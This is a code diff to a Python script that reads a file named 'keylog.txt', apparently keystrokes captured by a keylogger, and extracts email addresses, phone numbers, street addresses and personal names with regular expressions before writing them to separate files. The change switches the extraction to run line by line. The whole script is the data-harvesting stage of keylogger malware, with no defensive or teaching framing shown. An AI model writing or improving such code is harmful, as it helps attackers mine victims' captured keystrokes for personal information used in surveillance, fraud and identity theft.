@@ -29,21 +29,30 @@ def get_clean_data():
     with open("keylog.txt", "r") as file:
         log_data = file.read()
 
-    cleaned_data = ''.join([line.split(' ')[0] for line in log_data.splitlines()])
+    cleaned_data = [line for line in log_data.splitlines()]
     return cleaned_data
 
-def extracted_info(cleaned_data):
+def extracted_info(cleaned_data_list):
     email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
     phone_pattern = r'\+?\d{1,4}?[-.\s]?\(?\d{1,3}?\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}[-.\s]?\d{1,9}'
     address_pattern = r'\d{1,5}\s[\w\s]+(?:Street|St|Avenue|Ave|Road|Rd|Drive|Dr|Lane|Ln|Boulevard|Blvd)\s*,?\s*[\w\s]+(?:City|Town|Village|District|County|State|Province|Country)?'
     name_pattern = r'[A-Z][a-z]+\s[A-Z][a-z]+'
 
-    emails = re.findall(email_pattern, cleaned_data)
-    phone_numbers = re.findall(phone_pattern, cleaned_data)
-    addresses = re.findall(address_pattern, cleaned_data)
-    names = re.findall(name_pattern, cleaned_data)
+    # Initialize lists to store the results
+    emails = []
+    phone_numbers = []
+    addresses = []
+    names = []
+
+    # Iterate over each entry in the cleaned_data_list
+    for cleaned_data in cleaned_data_list:
+        emails.extend(re.findall(email_pattern, cleaned_data))
+        phone_numbers.extend(re.findall(phone_pattern, cleaned_data))
+        addresses.extend(re.findall(address_pattern, cleaned_data))
+        names.extend(re.findall(name_pattern, cleaned_data))
 
     return emails, phone_numbers, addresses, names
+
 
 def make_files(emails, phone_numbers, addresses, names):
     with open("emails.txt", "at") as email_file:
